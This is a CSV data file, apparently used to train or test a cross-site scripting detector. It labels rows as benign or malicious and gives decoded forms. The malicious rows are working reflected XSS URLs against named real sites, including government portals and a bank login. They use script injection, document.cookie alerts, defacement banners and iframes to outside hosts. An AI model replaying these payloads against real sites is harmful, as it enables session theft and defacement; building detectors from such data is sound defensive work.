Payloads,Class,decoded,executed,parser_changed
"<script>ymedia.use(""media-rmp"", function(y){y.media.rmp.load({""srcnode"":""#mediacontentrelatedstory_container"",""continueonerror"":true,""response"":""\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/plain; charset=utf-8\r\nrmp-embed-location: top\r\n\r\n<link rel=\""stylesheet\"" type=\""text\/css\"" href=\""http:\/\/l.yimg.com\/zz\/combo?os\/mit\/media\/m\/content_index\/generic-listings-desktop-min-da555a8.css&os\/mit\/media\/m\/content_index\/content-related-story-min-960a862.css\"" \/>\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/plain; charset=utf-8\r\nrmp-embed-location: bottom\r\n\r\n<script language=\""javascript\"">\n \nyui.yuicfg = {\""gallery\"":\""yui:gallery-2011.04.20-13-04\"",\""groups\"":{\""group01c9d8dea06e05460a64eed4dadd622b6\"":{\""base\"":\""http:\\\/\\\/l.yimg.com\\\/\"",\""combobase\"":\""http:\\\/\\\/l.yimg.com\\\/zz\\\/combo?\"",\""modules\"":{\""media-preview-default\"":{\""path\"":\""os\\\/mit\\\/media\\\/m\\\/content_index\\\/preview-default-min-e0e1d50.js\""}},\""combine\"":true,\""filter\"":\""min\"",\""root\"":\""\\\/\""}},\""combine\"":true,\""allowrollup\"":true,\""combobase\"":\""http:\\\/\\\/l.yimg.com\\\/zz\\\/combo?\"",\""fetchcss\"":false,\""maxurllength\"":\""2000\""}\nyui.yuicfg.root='yui:'+yui.version+'\/build\/';\nymedia.applyconfig(yui.yuicfg);\nyui.env[yui.version].base = 'http:\/\/l.yimg.com\/';\nyui.env[yui.version].combobase = 'http:\/\/l.yimg.com\/zz\/combo?';\nyui.env[yui.version].root = 'yui:'+yui.version+'\/build\/';\nyui.env.add(window, \""load\"", function(){\nymedia.use(\""media-preview-default\"",function(y){\n \n y.later(10, this, function() {(function(){ var rapid = ymedia.rapid; if (rapid) { rapid.addmodules(\""mediacontentrelatedstory\""); } }());\n });\n});\n});\n \n <\/script>\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/html; charset=utf-8\r\n\r\n\n\r\n--dali-response-split-5731c5f87665b--\r\n""});});</script><!-- fe183.global.media.ir2.yahoo.com compressed/chunked tue may 10 11:28:56 utc 2016 -->",Benign,"<script>ymedia.use(""media-rmp"", function(y){y.media.rmp.load({""srcnode"":""#mediacontentrelatedstory_container"",""continueonerror"":true,""response"":""\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/plain; charset=utf-8\r\nrmp-embed-location: top\r\n\r\n<link rel=\""stylesheet\"" type=\""text\/css\"" href=\""http:\/\/l.yimg.com\/zz\/combo?os\/mit\/media\/m\/content_index\/generic-listings-desktop-min-da555a8.css&os\/mit\/media\/m\/content_index\/content-related-story-min-960a862.css\"" \/>\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/plain; charset=utf-8\r\nrmp-embed-location: bottom\r\n\r\n<script language=\""javascript\"">\n \nyui.yuicfg = {\""gallery\"":\""yui:gallery-2011.04.20-13-04\"",\""groups\"":{\""group01c9d8dea06e05460a64eed4dadd622b6\"":{\""base\"":\""http:\\\/\\\/l.yimg.com\\\/\"",\""combobase\"":\""http:\\\/\\\/l.yimg.com\\\/zz\\\/combo?\"",\""modules\"":{\""media-preview-default\"":{\""path\"":\""os\\\/mit\\\/media\\\/m\\\/content_index\\\/preview-default-min-e0e1d50.js\""}},\""combine\"":true,\""filter\"":\""min\"",\""root\"":\""\\\/\""}},\""combine\"":true,\""allowrollup\"":true,\""combobase\"":\""http:\\\/\\\/l.yimg.com\\\/zz\\\/combo?\"",\""fetchcss\"":false,\""maxurllength\"":\""2000\""}\nyui.yuicfg.root='yui:' yui.version '\/build\/';\nymedia.applyconfig(yui.yuicfg);\nyui.env[yui.version].base = 'http:\/\/l.yimg.com\/';\nyui.env[yui.version].combobase = 'http:\/\/l.yimg.com\/zz\/combo?';\nyui.env[yui.version].root = 'yui:' yui.version '\/build\/';\nyui.env.add(window, \""load\"", function(){\nymedia.use(\""media-preview-default\"",function(y){\n \n y.later(10, this, function() {(function(){ var rapid = ymedia.rapid; if (rapid) { rapid.addmodules(\""mediacontentrelatedstory\""); } }());\n });\n});\n});\n \n <\/script>\r\n--dali-response-split-5731c5f87665b\r\ncontent-type: text\/html; charset=utf-8\r\n\r\n\n\r\n--dali-response-split-5731c5f87665b--\r\n""});});</script><!-- fe183.global.media.ir2.yahoo.com compressed/chunked tue may 10 11:28:56 utc 2016 -->",False,True
http://www.usafis.org/_sys/en/count_land_new.asp?af=w%22%3e%3cimg%20src=%22x%22%20onerror=%22alert(1<br>23)%22%3e,Malicious,"http://www.usafis.org/_sys/en/count_land_new.asp?af=w""><img src=""x"" onerror=""alert(123)"">",True,True
http://search.pmo.gov.my/i/?p=%3c/title%3e%3cscript%3ealert('l')%3c/script%3e,Malicious,http://search.pmo.gov.my/i/?p=</title><script>alert('l')</script>,True,True
entrar&login=moon&pwd=l4t9rgo&remember=off&b1=entrar,Benign,entrar&login=moon&pwd=l4t9rgo&remember=off&b1=entrar,False,False
"<iframe src=""javascript:javascript:alert(1);""></iframe>",Malicious,"<iframe src=""javascript:javascript:alert(1);""></iframe>",True,True
http://www.wikihow.com/listen-to-free-disney-parks-music-online-on-live365&t=1396527983101&n=856173&k=mainentity,Benign,http://www.wikihow.com/listen-to-free-disney-parks-music-online-on-live365&t=1396527983101&n=856173&k=mainentity,False,False
http://blog.zol.com.cn/userinfo.php?userid=%3e%3ctitle%3etoplamda%20c%c4%b0hana%20bastik%20:)%3c/tit<br>le%3e%3cscript%3edocument.write('cyber-emperor@hotmail.com')%3c/script%3e%3cmarquee%3e%3ch1%3exssed%<br>20by%20cyber%20|%20ferda%20forever%3c/h1%3e%3c/marquee%3e%3cimg%20src=%22http://img246.imageshack.us<br>/img246/9121/wattarmadt1.jpg%22%3e%3cscript%3ealert%20('cyber%20was%20here')%3c/script%3e%3c,Malicious,"http://blog.zol.com.cn/userinfo.php?userid=><title>toplamda cİhana bastik :)</title><script>document.write('cyber-emperor@hotmail.com')</script><marquee><h1>xssed by cyber | ferda forever</h1></marquee><img src=""http://img246.imageshack.us/img246/9121/wattarmadt1.jpg""><script>alert ('cyber was here')</script><",True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=7&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso manchego&precio=100&cantidad=7&b1=a�adir al carrito,False,False
http://www.emp.lt/?mact=search%2ccntnt33%2cdosearch%2c0&amp;cntnt33returnid=15&amp;cntnt33searchinput=%3cscr<br>ipt%3ealert%28document.cookie%29%3c%2fscript%3e&amp;cntnt33submit.x=0&amp;cntnt33submit.y=0,Malicious,"http://www.emp.lt/?mact=search,cntnt33,dosearch,0&cntnt33returnid=15&cntnt33searchinput=<script>alert(document.cookie)</script>&cntnt33submit.x=0&cntnt33submit.y=0",True,True
http://www.uniformionline.it/login.asp?n=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;<br>/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.uniformionline.it/login.asp?n=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dan&password=0526d1noso&nombre=rudolfo&apellidos=triginer+molledo&email=figgis-hallak%40hostrofessional.com.jobs&dni=95465534d&direccion=c%2f+divino+morales+103%2c+2-d&ciudad=villanueva+del+pardillo&cp=08785&provincia=soria&ntc=9662788555336601&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dan&password=0526d1noso&nombre=rudolfo&apellidos=triginer molledo&email=figgis-hallak@hostrofessional.com.jobs&dni=95465534d&direccion=c/ divino morales 103, 2-d&ciudad=villanueva del pardillo&cp=08785&provincia=soria&ntc=9662788555336601&b1=registrar",False,False
http://www.post.su/katalogssilok/poisk.php?poisk=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2<br>fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.post.su/katalogssilok/poisk.php?poisk='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.pesyani.net/search.php?kword=%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%20%3cscript%3ealert('by%20st@rext')%3c/script%3e,Malicious,"http://www.pesyani.net/search.php?kword=""><h1>by st@rext</h1><script>alert(document.cookie)</script> <script>alert('by st@rext')</script>",True,True
http://ipcprogram.com/main.php?id=janlady6%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://ipcprogram.com/main.php?id=janlady6""><script>alert(document.cookie)</script>",True,True
"A small jewel in a jewel of a city Ca' Dei Dogi is in a perfect location behind the Doge's Palace. You walk along the water past the Palace, go over a bridge, then turn into the first alley on your left, make the next left into another alley, and voila! you are in a small courtyard facing a beautiful old home that has been turned into an up to ",Benign,"A small jewel in a jewel of a city Ca' Dei Dogi is in a perfect location behind the Doge's Palace. You walk along the water past the Palace, go over a bridge, then turn into the first alley on your left, make the next left into another alley, and voila! you are in a small courtyard facing a beautiful old home that has been turned into an up to ",False,False
https://windata.de/2007/bestellung2.asp?anr=1&amp;sv=nein&amp;ra=&lt;&quot;&lt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"https://windata.de/2007/bestellung2.asp?anr=1&sv=nein&ra=<""<<script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=63&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n ib�rico&precio=39&cantidad=63&b1=a�adir al carrito,False,False
http://ms110.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms110.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
"Boutique Style Hotel near Downtown LA Some of the reviews here had me hesitant to try the Clarion.I'm glad I stayed there.The building is fairly old, but it has been up",Benign,"Boutique Style Hotel near Downtown LA Some of the reviews here had me hesitant to try the Clarion.I'm glad I stayed there.The building is fairly old, but it has been up",False,False
http://email.rad.gov.tw/phpinfo.php?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious,http://email.rad.gov.tw/phpinfo.php?a[]=><script>alert(/kabus/);</script>,True,True
http://www.largepassions.com/desearch/search.html?start=80&amp;citystate=all%3ala%27%22%3e%3cimg%20src=k<br>.png%20onerror=alert(/xss/.source)%20/%3e&amp;country=usa&amp;minage=&amp;maxage=&amp;lookingfor=&amp;onlyphotos=&amp;groupn<br>ame=&amp;loggedin=&amp;fullcount=239&amp;keywords=,Malicious,"http://www.largepassions.com/desearch/search.html?start=80&citystate=all:la'""><img src=k.png onerror=alert(/xss/.source) />&country=usa&minage=&maxage=&lookingfor=&onlyphotos=&groupname=&loggedin=&fullcount=239&keywords=",True,True
http://www.mediatv.nl/zoeken.php?searchbox=%22%3e%3cscript%3ealert%20%28%27killer-tr%27%29%3c/script<br>%3e%27%22%3e%3ciframe+src%3dhttp%3a%2f%2fi43.tinypic.com/2lksbgo.png%3e,Malicious,"http://www.mediatv.nl/zoeken.php?searchbox=""><script>alert ('killer-tr')</script>'""><iframe src=http://i43.tinypic.com/2lksbgo.png>",True,True
http://ms167.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms167.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.lubetube.com/search/videos?search_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.lubetube.com/search/videos?search_id=""><script>alert(document.cookie)</script>",True,True
"loud noisy highway traffic, uncomfortable beds! showreview(1774846, 'full');",Benign,"loud noisy highway traffic, uncomfortable beds! showreview(1774846, 'full');",False,False
http://www.sirantarim.gov.tr/test/php/php_info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious,"http://www.sirantarim.gov.tr/test/php/php_info.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://www.jivesoftware.com/webchat/email/offline-mail.jsp?workgroup=sales2@workgroup.jivesoftware.c<br>om'&quot;&gt;%3cscript&gt;alert(1)%3c/script&gt;,Malicious,"http://www.jivesoftware.com/webchat/email/offline-mail.jsp?workgroup=sales2@workgroup.jivesoftware.com'""><script>alert(1)</script>",True,True
http://www.wikihow.com/find-the-best-packers-and-movers-service-in-your-city&t=1396563819423&n=2636446&k=mainentity,Benign,http://www.wikihow.com/find-the-best-packers-and-movers-service-in-your-city&t=1396563819423&n=2636446&k=mainentity,False,False
https://freeriatools.adobe.com/flashbuilderproject/flexform.php?language=de%22%3e%3cscript%3ealert%2<br>8%22xss%22%29%3c/script%3e,Malicious,"https://freeriatools.adobe.com/flashbuilderproject/flexform.php?language=de""><script>alert(""xss"")</script>",True,True
http://www.akfinancialplanners.com//?page=companies&id=1446&name=%22%3e%3ciframe%20src=http://hotturks.org/%3e/?page=companies&id=1446&name=%22%3e%3cscript%3ealert('thelegend%20')%3c/script%3edemo%20:%20http://mnhairremoval.com//?page=companies&id=1446&name=%22%3e%3ciframe%20src=http://hotturks.org/%3e,Malicious,"http://www.akfinancialplanners.com//?page=companies&id=1446&name=""><iframe src=http://hotturks.org/>/?page=companies&id=1446&name=""><script>alert('thelegend ')</script>demo : http://mnhairremoval.com//?page=companies&id=1446&name=""><iframe src=http://hotturks.org/>",True,True
http://www.wikihow.com/get-your-natural-skin-tone&t=1396594130405&n=3924488&k=mainentity,Benign,http://www.wikihow.com/get-your-natural-skin-tone&t=1396594130405&n=3924488&k=mainentity,False,False
nice big rooms we've just arrived back from a short trip to ny and stayed 3 nights at the affinia dumont.we selected the hotel based purely on tripadvisor reviews and have not been let down. the location is very good (lexington and 34th) so everything is quite close by and check in was painless (although it did look a little busy in the morning). we had 2 studio rooms (one with king bed and one with two queens) and the rooms were huge in comparison to a typical ny hotel. to my surprise they also had a fully functional kitchen which was great if you want to eat in for breakfast/dinner.admittedly the rooms did look a little,Benign,nice big rooms we've just arrived back from a short trip to ny and stayed 3 nights at the affinia dumont.we selected the hotel based purely on tripadvisor reviews and have not been let down. the location is very good (lexington and 34th) so everything is quite close by and check in was painless (although it did look a little busy in the morning). we had 2 studio rooms (one with king bed and one with two queens) and the rooms were huge in comparison to a typical ny hotel. to my surprise they also had a fully functional kitchen which was great if you want to eat in for breakfast/dinner.admittedly the rooms did look a little,False,False
http://software.gsfc.nasa.gov/classlist.cfm?search=%22%3cscript%3ealert%28%22kaksii+was+here%22%29%3<br>c%2fscript%3e%3c%2ftextarea%3ealert%28,Malicious,"http://software.gsfc.nasa.gov/classlist.cfm?search=""<script>alert(""kaksii was here"")</script></textarea>alert(",True,True
registro&login=mongo&password=behetr%eda&nombre=fanny&apellidos=llort+pato&email=twiggy%40ladigianni.vc&dni=07831245k&direccion=calle+do+fuso+19+&ciudad=piqueras&cp=06208&provincia=soria&ntc=3479188393486250&b1=registrar,Benign,registro&login=mongo&password=behetr�a&nombre=fanny&apellidos=llort pato&email=twiggy@ladigianni.vc&dni=07831245k&direccion=calle do fuso 19 &ciudad=piqueras&cp=06208&provincia=soria&ntc=3479188393486250&b1=registrar,False,False
http://www.wikihow.com/apply-makeup-for-a-%27no-makeup-look%27-ideal-for-school&t=1396593814426&n=3908428&k=mainentity,Benign,http://www.wikihow.com/apply-makeup-for-a-'no-makeup-look'-ideal-for-school&t=1396593814426&n=3908428&k=mainentity,False,False
http://blog.epayment.ro/?s=&quot;'/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://blog.epayment.ro/?s=""'/><script>alert(document.cookie)</script>",True,True
https://login.pohjola.fi/sda_login/app?userid=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;meta%20content=&quot;,Malicious,"https://login.pohjola.fi/sda_login/app?userid=""><script>alert('xss')</script><meta content=""",True,True
http://www.bobiler.org/foto_gosterici.asp?foto=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(12)&lt;/script&gt;,Malicious,"http://www.bobiler.org/foto_gosterici.asp?foto=""></script><script>alert(12)</script>",True,True
http://observatory2.angkasa.gov.my/langkawibrowserastronomy/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(<br>'xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://observatory2.angkasa.gov.my/langkawibrowserastronomy/igallery/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maneatis4&password=pa3d0039i4o&nombre=lamec&apellidos=laconich+fraga&email=clugston%40restaurantepicopico.bo&dni=76195343t&direccion=calle+bartolome+ordo%f1ez+74+&ciudad=tejado&cp=05690&provincia=girona&ntc=3295070876764042&b1=registrar,Benign,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maneatis4&password=pa3d0039i4o&nombre=lamec&apellidos=laconich fraga&email=clugston@restaurantepicopico.bo&dni=76195343t&direccion=calle bartolome ordo�ez 74 &ciudad=tejado&cp=05690&provincia=girona&ntc=3295070876764042&b1=registrar,False,False
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5436&b1=confirmar,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5436&b1=confirmar,False,False
http://www.wikihow.com/download-fantasy-games&t=1396532186893&n=1055002&k=mainentity,Benign,http://www.wikihow.com/download-fantasy-games&t=1396532186893&n=1055002&k=mainentity,False,False
http://hcr3.isiknowledge.com/formbrowse.cgi?error=1&amp;&amp;link1=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious,"http://hcr3.isiknowledge.com/formbrowse.cgi?error=1&&link1=</textarea>'""><script>alert(document.cookie)</script>",True,True
